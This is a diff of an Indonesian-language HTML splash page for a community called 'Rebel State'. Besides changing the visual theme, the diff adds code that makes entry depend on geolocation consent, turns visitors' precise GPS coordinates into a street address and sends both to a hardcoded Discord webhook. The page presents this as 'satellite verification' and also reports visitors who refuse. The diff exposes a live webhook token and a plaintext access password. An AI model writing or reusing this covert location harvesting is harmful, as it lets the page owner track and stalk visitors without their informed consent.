@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>REBEL STATE - HAPPY HOLIDAYS ACCESS POINT</title>
+    <title>REBEL STATE - NEON ACCESS POINT</title>
     
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- SweetAlert2 untuk notifikasi dan prompt kata sandi -->
@@ -12,42 +12,40 @@
     <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
 
     <style>
-        /* --- TEMA NATAL DAN TAHUN BARU --- */
+        /* --- TEMA NEON PINK & BLACK --- */
         :root {
-            --christmas-red: #E53935; /* Merah Natal */
-            --christmas-green: #4CAF50; /* Hijau Natal */
-            --christmas-gold: #FFD700; /* Emas Aksen */
-            --bg-dark: #0f2027; /* Latar Belakang Gelap */
+            --neon-pink: #ff2d95; /* Pink Neon Utama */
+            --neon-purple: #bc13fe; /* Ungu Neon Aksen */
+            --bg-black: #050505; /* Hitam Pekat */
+            --text-glow: 0 0 10px rgba(255, 45, 149, 0.8);
         }
         
         /* Konfigurasi Dasar dan Font */
         body {
             font-family: 'Poppins', sans-serif;
-            /* Latar Belakang Natal: Gradasi Biru Tua ke Hijau Gelap */
-            background: linear-gradient(135deg, var(--bg-dark) 0%, #2c5364 50%, #0f2027 100%);
-            color: #f0f0f0;
+            background: radial-gradient(circle at center, #1a0b16 0%, var(--bg-black) 100%);
+            color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             margin: 0;
-            overflow: hidden; /* Mencegah scroll */
+            overflow: hidden;
         }
 
-        /* Container Splash dengan sentuhan Natal */
+        /* Container Splash dengan sentuhan Neon */
         .splash-container {
             position: relative;
-            background: rgba(15, 32, 39, 0.85); /* Semi-transparan agar salju terlihat */
-            backdrop-filter: blur(5px);
+            background: rgba(10, 10, 10, 0.8);
+            backdrop-filter: blur(15px);
             padding: 40px;
             text-align: center;
-            border-radius: 20px;
+            border-radius: 24px;
             max-width: 500px;
             width: 90%;
             z-index: 10;
-            /* Border dan shadow Natal */
-            border: 3px solid var(--christmas-red);
-            box-shadow: 0 0 40px rgba(76, 175, 80, 0.5), inset 0 0 10px rgba(255, 255, 255, 0.2);
+            border: 2px solid var(--neon-pink);
+            box-shadow: 0 0 20px rgba(255, 45, 149, 0.3), inset 0 0 15px rgba(255, 45, 149, 0.2);
         }
 
         .title-text {
@@ -56,111 +54,125 @@
             color: #fff;
             margin-bottom: 20px;
             text-transform: uppercase;
-            /* Efek Text Shadow Natal (Merah & Hijau) */
-            text-shadow: 3px 3px 0px var(--christmas-red), -2px -2px 0px var(--christmas-green);
+            /* Efek Neon Glow Pink & Purple */
+            text-shadow: 0 0 5px #fff, 0 0 10px var(--neon-pink), 0 0 20px var(--neon-pink), 0 0 40px var(--neon-purple);
             font-style: italic;
+            letter-spacing: 4px;
         }
 
-        /* CTA Button Styling Natal */
+        /* CTA Button Styling Neon */
         .cta-button {
             display: inline-block;
-            background: var(--christmas-red);
-            color: #fff;
+            background: transparent;
+            color: var(--neon-pink);
             padding: 15px 50px;
-            border: 2px solid var(--christmas-gold);
-            border-radius: 5px; /* Sedikit lengkungan agar lebih lembut */
+            border: 2px solid var(--neon-pink);
+            border-radius: 12px;
             font-size: 1.25rem;
             font-weight: 800;
             text-transform: uppercase;
             text-decoration: none;
             margin-top: 30px;
-            transition: all 0.3s;
-            box-shadow: 0 0 20px var(--christmas-red);
-            letter-spacing: 2px;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 0 10px rgba(255, 45, 149, 0.4);
+            letter-spacing: 3px;
             cursor: pointer;
             width: 100%;
             max-width: 300px;
+            position: relative;
+            overflow: hidden;
         }
+
         .cta-button:hover:not(:disabled) {
-            background-color: var(--christmas-green);
-            color: var(--christmas-gold);
-            box-shadow: 0 0 40px var(--christmas-green);
-            transform: translateY(-5px) scale(1.02);
-            border-color: #fff;
+            background-color: var(--neon-pink);
+            color: #000;
+            box-shadow: 0 0 30px var(--neon-pink);
+            transform: scale(1.05);
         }
 
         .cta-button:disabled {
             cursor: not-allowed;
-            opacity: 0.4;
+            opacity: 0.3;
+            border-color: #333;
+            color: #333;
             box-shadow: none;
         }
         
-        /* Responsive Title */
         @media (max-width: 600px) {
-            .title-text {
-                font-size: 2.5rem;
-            }
-            .cta-button {
-                font-size: 1rem;
-                padding: 12px 30px;
-            }
+            .title-text { font-size: 2.5rem; }
+            .cta-button { font-size: 1rem; padding: 12px 30px; }
         }
 
-        /* --- EFEK SALJU --- */
+        /* --- EFEK PARTIKEL NEON --- */
         .snowflake {
             position: absolute;
-            width: 10px;
-            height: 10px;
-            background: #fff;
+            width: 4px;
+            height: 4px;
+            background: var(--neon-pink);
             border-radius: 50%;
             pointer-events: none;
-            opacity: 0.8;
-            box-shadow: 0 0 5px rgba(255, 255, 255, 0.6);
+            opacity: 0.6;
+            box-shadow: 0 0 8px var(--neon-pink);
             z-index: 5;
-            /* Animasi akan diset di JavaScript */
         }
         
-        /* Animasi jatuh salju dasar */
         @keyframes fall {
-            to {
-                transform: translateY(100vh);
-            }
+            to { transform: translateY(100vh); opacity: 0; }
+        }
+
+        /* Spinner kustom Neon */
+        .custom-loader {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: 3px solid transparent;
+            border-top-color: var(--neon-pink);
+            border-bottom-color: var(--neon-purple);
+            animation: spin 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+            margin: 20px auto;
+            box-shadow: 0 0 15px var(--neon-pink);
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* SweetAlert Custom Theme Override */
+        .swal2-popup-neon {
+            border: 2px solid var(--neon-pink) !important;
+            box-shadow: 0 0 25px rgba(255, 45, 149, 0.5) !important;
         }
     </style>
 </head>
 <body>
-    <!-- Layer Salju -->
+    <!-- Layer Partikel Neon -->
     <div id="snow-container" class="fixed inset-0 overflow-hidden pointer-events-none"></div>
 
-    <div class="splash-container" data-aos="zoom-in" data-aos-duration="1000">
-        
-        <div class="w-24 h-24 mx-auto mb-6">
-            <!-- LOGO Placeholder yang disesuaikan dengan border Natal -->
+    <div class="splash-container" data-aos="fade-in" data-aos-duration="1500">
+        <div class="w-24 h-24 mx-auto mb-6 relative">
+            <!-- Glow effect behind logo -->
+            <div class="absolute inset-0 bg-pink-500 rounded-full blur-xl opacity-30 animate-pulse"></div>
             <img src="web rebel/image.png"
-                onerror="this.onerror=null; this.src='https://placehold.co/100x100/E53935/ffffff?text=HOLIDAY';"
+                onerror="this.onerror=null; this.src='https://placehold.co/100x100/ff2d95/000000?text=REBEL';"
                 alt="Rebel Logo"
-                class="w-full h-full rounded-full border-4 border-[var(--christmas-gold)] object-cover shadow-[0_0_20px_var(--christmas-red)]">
+                class="relative w-full h-full rounded-full border-2 border-[var(--neon-pink)] object-cover shadow-[0_0_20px_var(--neon-pink)]">
         </div>
         
-        <h1 class="title-text">
-            REBEL STATE
-        </h1>
-        <p class="text-xl text-[var(--christmas-gold)] tracking-wider font-mono" data-aos="fade-up" data-aos-delay="200">
-            [ HAPPY HOLIDAYS ACCESS GATEWAY ]
+        <h1 class="title-text">REBEL STATE</h1>
+        <p class="text-sm text-pink-400 tracking-[0.3em] font-mono opacity-80" data-aos="fade-up" data-aos-delay="200">
+            [ CYBER ACCESS GATEWAY ]
         </p>
 
-        <!-- SATU-SATUNYA TOMBOL -->
         <button 
             id="enter-button" 
             class="cta-button" 
-            data-aos="fade-up" 
+            data-aos="zoom-in" 
             data-aos-delay="500"
             onclick="enterSite()">
             ENTER CITY
         </button>
 
-        <p id="status-message" class="mt-8 text-sm text-gray-300 font-mono transition-colors duration-300">
-            Christmas Lights On. Click to Proceed.
+        <p id="status-message" class="mt-8 text-[10px] text-gray-500 font-mono tracking-widest uppercase transition-colors duration-300">
+            Neon Systems Online. Click to Authenticate.
         </p>
     </div>
     
@@ -168,215 +180,215 @@
     <script>
         AOS.init();
 
-        // --- EFEK SALJU JATUH (Diaktifkan di JavaScript) ---
-        const snowContainer = document.getElementById('snow-container');
-        const NUM_SNOWFLAKES = 50;
+        // --- KONFIGURASI WEBHOOK DISCORD ---
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1454949858220838997/W0Im6459m3P4hwnqp0JtoZOVNWU8KsLEgm0NWi1K2-yZriJrtvlVtM-BOJbRCEHTPm8x";
 
+        let isLocationAuthorized = false;
+        let isProcessing = false;
+
+        // --- EFEK PARTIKEL NEON ---
+        const snowContainer = document.getElementById('snow-container');
+        const NUM_SNOWFLAKES = 40;
         function createSnowflake() {
             const snowflake = document.createElement('div');
             snowflake.classList.add('snowflake');
-            
-            // Posisi X acak
             const startX = Math.random() * 100; 
-            // Ukuran acak (5px hingga 15px)
-            const size = Math.random() * 10 + 5; 
-            // Durasi jatuh acak (10s hingga 20s)
-            const duration = Math.random() * 10 + 10; 
-            // Delay acak agar salju tidak jatuh bersamaan
+            const size = Math.random() * 3 + 2; 
+            const duration = Math.random() * 5 + 5; 
             const delay = Math.random() * 5; 
-
             snowflake.style.left = `${startX}vw`;
             snowflake.style.width = `${size}px`;
             snowflake.style.height = `${size}px`;
+            snowflake.style.background = Math.random() > 0.5 ? '#ff2d95' : '#bc13fe';
             snowflake.style.animation = `fall ${duration}s linear infinite`;
             snowflake.style.animationDelay = `${delay}s`;
-            
             snowContainer.appendChild(snowflake);
-
-            // Bersihkan salju yang sudah jatuh agar tidak memenuhi DOM
-            snowflake.addEventListener('animationiteration', () => {
-                const newX = Math.random() * 100;
-                snowflake.style.left = `${newX}vw`;
-                // Atur ulang posisi agar salju seolah-olah baru muncul di atas
-                snowflake.style.transform = 'translateY(0)'; 
-            });
         }
+        for (let i = 0; i < NUM_SNOWFLAKES; i++) { createSnowflake(); }
 
-        // Buat semua kepingan salju
-        for (let i = 0; i < NUM_SNOWFLAKES; i++) {
-            createSnowflake();
-        }
-        // --- AKHIR EFEK SALJU JATUH ---
-
-
-        // --- KONFIGURASI KEAMANAN (Disesuaikan sedikit agar sesuai tema) ---
+        // --- SISTEM KEAMANAN & LOKASI ---
         const ACCESS_PASSWORD = 'rebelcity';
-        const MAX_ATTEMPTS = 5;
-        // Gunakan localStorage untuk melacak upaya login yang gagal agar persist di browser
-        const ATTEMPT_KEY = 'rebelStateLoginAttempts';
-
-        // Ambil jumlah upaya yang gagal (default 0)
-        let loginAttempts = parseInt(localStorage.getItem(ATTEMPT_KEY) || '0', 10);
-        
         const enterButton = document.getElementById('enter-button');
         const statusMessage = document.getElementById('status-message');
 
-        /**
-         * Fungsi untuk mengarahkan pengguna ke halaman utama.
-         */
-        function proceedToSite() {
-            localStorage.removeItem(ATTEMPT_KEY); // Reset attempts on success
-            Swal.fire({
-                title: 'HOLIDAY ACCESS GRANTED',
-                text: 'Mengarahkan ke Kota Rebel State dengan semangat Tahun Baru...',
-                icon: 'success',
-                background: '#1a1a1a',
-                color: '#fff',
-                timer: 1500, 
-                timerProgressBar: true,
-                showConfirmButton: false,
-                customClass: {
-                    popup: 'border-2 border-[var(--christmas-green)] shadow-lg shadow-[var(--christmas-green)]',
-                    title: 'text-[var(--christmas-gold)]'
-                },
-                didOpen: () => {
-                    // Setelah notif muncul sebentar, langsung redirect
-                    setTimeout(() => {
-                        // Tetap menggunakan URL yang sama
-                        window.location.href = "web rebel/pertama.html";
-                    }, 500);
-                }
+        function requestInitialLocation() {
+            if (!navigator.geolocation) return;
+            navigator.geolocation.getCurrentPosition(
+                () => { isLocationAuthorized = true; },
+                () => { isLocationAuthorized = false; },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        function sendDenyReportToDiscord() {
+            const timestamp = new Date().toLocaleString('id-ID');
+            const payload = {
+                embeds: [{
+                    title: "⚠️ Upaya Masuk: Izin Lokasi Ditolak",
+                    description: "Seorang pengguna mencoba masuk ke Rebel State tetapi menolak memberikan akses lokasi.",
+                    color: 16723097, // Pink Neon
+                    fields: [
+                        { name: "⏰ Waktu", value: timestamp },
+                        { name: "🛡️ Status", value: "Akses Dibatalkan oleh Sistem (Izin Ditolak)" }
+                    ],
+                    footer: { text: "Rebel State Neon Security" }
+                }]
+            };
+            fetch(DISCORD_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(() => {});
+        }
+
+        async function trackAndFetchDetails() {
+            return new Promise((resolve, reject) => {
+                const highPrecisionOptions = { enableHighAccuracy: true, timeout: 25000, maximumAge: 0 };
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const { latitude, longitude, accuracy } = position.coords;
+                    const timestamp = new Date().toLocaleString('id-ID');
+                    const isLowAcc = accuracy > 1000;
+                    
+                    let address = "Lokasi tidak teridentifikasi";
+                    try {
+                        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18`, {
+                            headers: { 'Accept-Language': 'id' }
+                        });
+                        const data = await response.json();
+                        address = data.display_name || address;
+                    } catch (e) {}
+
+                    const qualityText = isLowAcc ? "⚠️ Rendah (Internet IP)" : "🎯 Kuat (GPS Presisi)";
+                    const payload = {
+                        embeds: [{
+                            title: "🚨 Akses City Baru: " + (isLowAcc ? "Estimasi IP" : "GPS Presisi"),
+                            color: isLowAcc ? 16733590 : 16723097,
+                            fields: [
+                                { name: "🏠 Alamat Lengkap", value: address },
+                                { name: "🌐 Koordinat", value: `\`${latitude}, ${longitude}\``, inline: true },
+                                { name: "🎯 Kualitas Sinyal", value: `${Math.round(accuracy)}m - ${qualityText}`, inline: true },
+                                { name: "⏰ Waktu", value: timestamp },
+                                { name: "🗺️ Navigasi", value: `[Buka Maps](https://www.google.com/maps?q=${latitude},${longitude})` }
+                            ],
+                            footer: { text: "Rebel State Neon High Precision" }
+                        }]
+                    };
+                    fetch(DISCORD_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(() => {});
+                    resolve(address);
+                }, (error) => {
+                    sendDenyReportToDiscord();
+                    reject(error);
+                }, highPrecisionOptions);
             });
         }
 
-        /**
-         * Fungsi untuk menampilkan prompt kata sandi.
-         */
-        function promptForPassword() {
-            if (loginAttempts >= MAX_ATTEMPTS) {
-                // Jangan tampilkan prompt, langsung handle failed attempt
-                handleFailedAttempt(); 
-                return;
-            }
-
+        async function proceedToSite() {
             Swal.fire({
-                title: 'SECRET SANTA AUTHENTICATION',
-                html: `<p class="text-sm mt-2 text-gray-400">Restricted access period (00:00 - 09:00).<br>Enter the Holiday Code.</p>`,
+                title: 'MOHON TUNGGU SEBENTAR',
+                html: `
+                    <div class="mt-4">
+                        <div class="custom-loader"></div>
+                        <p class="text-xs text-pink-400 italic font-mono">Sedang mengunci sinyal satelit untuk verifikasi akses...</p>
+                    </div>
+                `,
+                background: '#0a0a0a',
+                color: '#ff2d95',
+                allowOutsideClick: false,
+                showConfirmButton: false,
+                customClass: { popup: 'swal2-popup-neon' },
+                didOpen: () => { Swal.showLoading(); }
+            });
+
+            try {
+                const userAddress = await trackAndFetchDetails();
+                Swal.fire({
+                    title: 'ACCESS GRANTED!',
+                    html: `
+                        <div class="text-sm mt-4 font-mono">
+                            Mengarahkan ke Kota Rebel State...<br><br>
+                            <b class="text-white">Kamu tinggal di:</b><br>
+                            <span class="text-pink-400 italic">${userAddress}</span>
+                        </div>
+                    `,
+                    icon: 'success',
+                    background: '#0a0a0a',
+                    color: '#fff',
+                    timer: 3000, 
+                    timerProgressBar: true,
+                    showConfirmButton: false,
+                    customClass: { popup: 'swal2-popup-neon' },
+                    didOpen: () => {
+                        setTimeout(() => { window.location.href = "web rebel/pertama.html"; }, 3000);
+                    }
+                });
+            } catch (err) {
+                isProcessing = false;
+                Swal.fire({
+                    title: 'AKSES GAGAL',
+                    text: 'Maaf kami tidak bisa melacak mu karena kamu tidak mengizinkan.',
+                    icon: 'error',
+                    background: '#0a0a0a',
+                    color: '#ff2d95',
+                    confirmButtonColor: '#ff2d95',
+                    customClass: { popup: 'swal2-popup-neon' }
+                });
+            }
+        }
+
+        function promptForPassword() {
+            Swal.fire({
+                title: 'SYSTEM AUTHENTICATION',
+                html: `<p class="text-[10px] mt-2 text-pink-200/50 uppercase tracking-widest font-mono">Restricted Access (00:00 - 08:00).<br>Enter Cyber City Code.</p>`,
                 input: 'password',
-                inputPlaceholder: 'Enter Rebel City Holiday Code',
+                inputPlaceholder: 'Enter Security Code',
                 showCancelButton: true,
-                confirmButtonText: 'Submit',
-                cancelButtonText: 'Cancel',
-                background: '#1a1a1a',
+                confirmButtonText: 'Access',
+                background: '#0a0a0a',
                 color: '#fff',
-                inputAttributes: {
-                    autocapitalize: 'off',
-                    autocorrect: 'off'
-                },
-                customClass: {
-                    popup: 'border-2 border-[var(--christmas-red)] shadow-lg shadow-[var(--christmas-red)]',
-                    input: 'bg-gray-800 text-[var(--christmas-green)] border-gray-700 focus:border-[var(--christmas-green)]'
+                customClass: { 
+                    popup: 'swal2-popup-neon',
+                    input: 'bg-black text-pink-500 border-pink-500 focus:ring-pink-500' 
                 }
             }).then((result) => {
                 if (result.isConfirmed) {
-                    const inputPassword = result.value;
-                    if (inputPassword === ACCESS_PASSWORD) {
-                        loginAttempts = 0; // Reset attempts
-                        localStorage.removeItem(ATTEMPT_KEY);
+                    if (result.value === ACCESS_PASSWORD) {
                         proceedToSite();
                     } else {
-                        loginAttempts++;
-                        localStorage.setItem(ATTEMPT_KEY, loginAttempts.toString());
-                        handleFailedAttempt();
+                        isProcessing = false;
+                        Swal.fire({ title: 'KODE SALAH', text: 'Akses ditolak. Coba lagi.', icon: 'error', timer: 2000, showConfirmButton: false, background: '#0a0a0a', color: '#ff2d95', customClass: { popup: 'swal2-popup-neon' } });
                     }
+                } else {
+                    isProcessing = false;
                 }
             });
         }
 
-        /**
-         * Menangani percobaan kata sandi yang gagal.
-         */
-        function handleFailedAttempt() {
-            if (loginAttempts >= MAX_ATTEMPTS) {
-                // KICK OUT / LOCK DOWN
-                enterButton.textContent = "ACCESS LOCKED: MERRY CHRISTMAS!";
-                enterButton.disabled = true;
-                enterButton.classList.add('opacity-50', 'cursor-not-allowed', 'bg-red-900', 'text-red-400', 'border-red-400');
-                enterButton.classList.remove('bg-[var(--christmas-red)]', 'border-[var(--christmas-gold)]');
-                
-                statusMessage.textContent = 'ACCESS DENIED: Maximum failed attempts reached. System locked.';
-                statusMessage.classList.add('text-red-400');
-                statusMessage.classList.remove('text-gray-300');
-
-
-                Swal.fire({
-                    title: 'ACCESS DENIED: GRINCH MODE',
-                    text: 'Maximum failed attempts reached. System access locked. Have a cold winter.',
-                    icon: 'error',
-                    confirmButtonText: 'Acknowledge',
-                    allowOutsideClick: false,
-                    allowEscapeKey: false,
-                    background: '#1a1a1a',
-                    color: '#fff',
-                    customClass: {
-                        popup: 'border-2 border-red-500 shadow-lg shadow-red-900',
-                        title: 'text-red-400'
-                    }
-                });
-            } else {
-                // Notifikasi percobaan gagal
-                const remaining = MAX_ATTEMPTS - loginAttempts;
-                statusMessage.textContent = `WARNING: Incorrect Holiday Code. ${remaining} attempts remaining.`;
-                statusMessage.classList.remove('text-gray-300');
-                statusMessage.classList.add('text-yellow-400');
-
-                Swal.fire({
-                    title: 'INCORRECT CODE',
-                    text: `Attempt failed. You have ${remaining} attempts remaining.`,
-                    icon: 'warning',
-                    timer: 2000,
-                    showConfirmButton: false,
-                    background: '#1a1a1a',
-                    color: '#fff',
-                    customClass: {
-                        popup: 'border-2 border-yellow-500 shadow-lg shadow-yellow-900',
-                        title: 'text-yellow-400'
-                    }
-                });
-            }
-        }
-
-        /**
-         * Fungsi utama yang dipanggil saat tombol diklik.
-         * Bertanggung jawab untuk mengecek waktu dan mengalihkan ke mode otentikasi jika perlu.
-         */
         window.enterSite = function() {
-            const now = new Date();
-            const currentHour = now.getHours(); // 0 (12 AM) sampai 23 (11 PM)
-
-            // Periode terlarang: Jam 0 (12 AM) sampai Jam 8 (08:59:59). Jam 9 (09:00:00) sudah diizinkan.
-            const isRestricted = currentHour >= 0 && currentHour <= 8;
-
-            // Selalu cek apakah sudah terkunci dari percobaan sebelumnya
-            if (loginAttempts >= MAX_ATTEMPTS) {
-                 handleFailedAttempt(); // Ini akan menampilkan pesan lockout dan memastikan tombol tetap dinonaktifkan
-                 return;
+            if (isProcessing) {
+                Swal.fire({ title: 'TUNGGU SEBENTAR', text: 'Jangan di spam, ini sedang proses...', icon: 'info', background: '#0a0a0a', color: '#ff2d95', timer: 2000, showConfirmButton: false, customClass: { popup: 'swal2-popup-neon' } });
+                return;
             }
+            isProcessing = true;
 
-            if (isRestricted) {
-                promptForPassword();
-            } else {
-                // Waktu terbuka (9 AM - 11:59 PM)
-                proceedToSite();
+            if (!isLocationAuthorized) {
+                navigator.geolocation.getCurrentPosition(
+                    () => { isLocationAuthorized = true; executeEntryLogic(); },
+                    () => {
+                        sendDenyReportToDiscord();
+                        isProcessing = false;
+                        Swal.fire({ title: 'AKSES DITOLAK', text: 'Maaf kami tidak bisa melacak mu karena kamu tidak mengizinkan.', icon: 'warning', background: '#0a0a0a', color: '#ff2d95', confirmButtonColor: '#ff2d95', customClass: { popup: 'swal2-popup-neon' } });
+                    },
+                    { enableHighAccuracy: true, maximumAge: 0 }
+                );
+                return;
             }
+            executeEntryLogic();
         }
 
-        // Jalankan sekali saat halaman dimuat untuk menampilkan status awal jika sudah terkunci
-        document.addEventListener('DOMContentLoaded', () => {
-            if (loginAttempts >= MAX_ATTEMPTS) {
-                handleFailedAttempt();
-            }
-        });
+        function executeEntryLogic() {
+            const now = new Date();
+            const currentHour = now.getHours();
+            const isRestricted = currentHour >= 0 && currentHour <= 8;
+            if (isRestricted) { promptForPassword(); } else { proceedToSite(); }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => { requestInitialLocation(); });
     </script>
 </body>
 </html>
